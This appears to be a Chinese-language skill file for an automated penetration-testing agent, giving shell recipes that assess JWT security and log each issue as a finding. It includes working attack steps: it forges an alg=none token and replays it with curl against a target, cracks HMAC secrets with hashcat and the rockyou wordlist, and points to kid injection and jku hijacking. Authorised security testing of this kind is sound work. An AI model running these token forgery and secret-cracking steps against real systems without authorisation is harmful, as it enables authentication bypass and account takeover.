---
name: jwt-analysis
description: JWT 分析配方（解码 / none / HMAC / 过期 / 重放）
when_to_use: 响应或请求中出现 JWT
---
# JWT 分析

```bash
T='<jwt>'; TURL='https://target/api/me'
H=$(echo "$T" | cut -d. -f1); P=$(echo "$T" | cut -d. -f2)
b64d() { echo "$1" | tr '_-' '/+' | awk '{l=length($0)%4; if(l==2)print $0"=="; else if(l==3)print $0"="; else print $0}' | base64 -d 2>/dev/null; }

echo "--- header ---"; b64d "$H"; echo
echo "--- payload ---"; b64d "$P"; echo

# alg=none -> CRITICAL
b64d "$H" | grep -q '"alg": *"none"' && \
  add_finding critical jwt_none_algorithm "JWT uses alg=none" "$TURL" shell ""

# HS* -> MEDIUM（密钥混淆攻击面）
b64d "$H" | grep -qiE '"alg": *"HS(256|384|512)"' && \
  add_finding medium jwt_hmac_confusion "HMAC alg: key confusion surface" "$TURL" shell ""

# 无 exp -> HIGH
b64d "$P" | jq -e '.exp' >/dev/null 2>&1 || \
  add_finding high jwt_no_expiry "JWT has no exp claim" "$TURL" shell ""
```

## none 算法重放（服务端是否接受）
```bash
NH=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
code=$(curl -sSk -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $NH.$P." "$TURL")
echo "none-token replay -> HTTP $code"
case "$code" in 2*) add_finding critical jwt_none_accepted "Server accepts alg=none (HTTP $code)" "$TURL" curl "$NH.$P.";; esac
```

## 扩展（按需）
```bash
pip3 install --break-system-packages pyjwt 2>/dev/null
python3 -c "import jwt,sys;print(jwt.decode(sys.argv[1],options={'verify_signature':False}))" "$T"
hashcat -m 16500 -a 0 "$T" /usr/share/wordlists/rockyou.txt --force    # 弱密钥
# kid 注入 / jku 劫持：用 http/framework.md 的 repeater 改 header 重放
```
